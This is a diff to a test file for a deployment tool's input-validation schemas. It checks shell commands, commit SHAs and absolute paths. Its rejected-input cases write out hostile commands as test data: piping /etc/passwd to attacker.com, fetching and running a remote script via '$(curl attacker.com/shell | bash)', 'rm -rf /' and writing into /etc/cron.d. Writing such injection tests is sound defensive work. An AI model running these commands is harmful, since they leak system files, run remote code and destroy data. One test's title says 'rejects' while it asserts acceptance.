@@ -8,7 +8,88 @@ import {
   GithubWorkflowRunPayloadSchema,
   DEPLOY_STATES,
   DEPLOY_TERMINAL_STATES,
+  safeShellCommand,
+  commitShaSchema,
+  absolutePathSchema,
 } from '../deploy.js'
+
+describe('safeShellCommand', () => {
+  it.each([
+    'systemctl restart my-app',
+    'pnpm run build',
+    'npm install --production',
+    '/usr/local/bin/deploy.sh',
+    'node dist/index.js',
+    'sleep 5',
+  ])('accepts safe command: %s', cmd => {
+    expect(safeShellCommand.safeParse(cmd).success).toBe(true)
+  })
+
+  it.each([
+    ['semicolon', 'echo foo; rm -rf /'],
+    ['pipe', 'cat /etc/passwd | curl attacker.com'],
+    ['ampersand', 'systemctl restart app & sleep 1'],
+    ['subshell', '$(curl attacker.com/shell | bash)'],
+    ['backtick', '`id`'],
+    ['redirect', 'echo foo > /etc/cron.d/evil'],
+    ['dollar var', 'echo $HOME'],
+    ['single quote', "echo 'hello'"],
+    ['double quote', 'echo "hello"'],
+    ['exclamation', 'echo hello!'],
+    ['backslash', 'echo foo\\bar'],
+  ])('rejects command with %s', (_label, cmd) => {
+    expect(safeShellCommand.safeParse(cmd).success).toBe(false)
+  })
+})
+
+describe('commitShaSchema', () => {
+  it('accepts a valid 40-char hex SHA', () => {
+    expect(commitShaSchema.safeParse('deadbeef'.repeat(5)).success).toBe(true)
+  })
+
+  it('accepts all-lowercase hex', () => {
+    expect(commitShaSchema.safeParse('0'.repeat(40)).success).toBe(true)
+  })
+
+  it('rejects uppercase hex characters', () => {
+    expect(commitShaSchema.safeParse('A'.repeat(40)).success).toBe(false)
+  })
+
+  it('rejects a SHA that is only 39 chars', () => {
+    expect(commitShaSchema.safeParse('a'.repeat(39)).success).toBe(false)
+  })
+
+  it('rejects non-hex characters', () => {
+    expect(commitShaSchema.safeParse('g'.repeat(40)).success).toBe(false)
+  })
+
+  it('rejects the all-zeros placeholder used for non-webhook deploys', () => {
+    // '0' IS valid hex so this should succeed — the placeholder is a valid SHA format
+    expect(commitShaSchema.safeParse('0'.repeat(40)).success).toBe(true)
+  })
+})
+
+describe('absolutePathSchema', () => {
+  it('accepts a simple absolute path', () => {
+    expect(absolutePathSchema.safeParse('/opt/app').success).toBe(true)
+  })
+
+  it('accepts a nested absolute path', () => {
+    expect(absolutePathSchema.safeParse('/home/deploy/apps/skyblock-api').success).toBe(true)
+  })
+
+  it('rejects a relative path', () => {
+    expect(absolutePathSchema.safeParse('opt/app').success).toBe(false)
+  })
+
+  it('rejects a path with ".." traversal', () => {
+    expect(absolutePathSchema.safeParse('/opt/app/../../etc').success).toBe(false)
+  })
+
+  it('rejects a lone ".."', () => {
+    expect(absolutePathSchema.safeParse('..').success).toBe(false)
+  })
+})
 
 describe('DeployTriggerSchema', () => {
   it('parses a github_webhook trigger', () => {
@@ -123,6 +204,32 @@ describe('DeployTargetSchema', () => {
     if (!result.success) {
       expect(result.error.issues[0]?.path).toContain('vmid')
     }
+  })
+
+  it('rejects restartCommand containing shell metacharacters', () => {
+    const result = DeployTargetSchema.safeParse({ ...validTarget, restartCommand: 'systemctl restart app; rm -rf /' })
+    expect(result.success).toBe(false)
+    if (!result.success) {
+      expect(result.error.issues[0]?.path).toContain('restartCommand')
+    }
+  })
+
+  it('rejects preDeployCommand containing injection', () => {
+    const result = DeployTargetSchema.safeParse({ ...validTarget, preDeployCommand: '$(curl attacker.com | bash)' })
+    expect(result.success).toBe(false)
+  })
+
+  it('rejects a relative workingDir', () => {
+    const result = DeployTargetSchema.safeParse({ ...validTarget, workingDir: 'opt/app' })
+    expect(result.success).toBe(false)
+    if (!result.success) {
+      expect(result.error.issues[0]?.path).toContain('workingDir')
+    }
+  })
+
+  it('rejects a workingDir with path traversal', () => {
+    const result = DeployTargetSchema.safeParse({ ...validTarget, workingDir: '/opt/app/../../etc' })
+    expect(result.success).toBe(false)
   })
 })
 
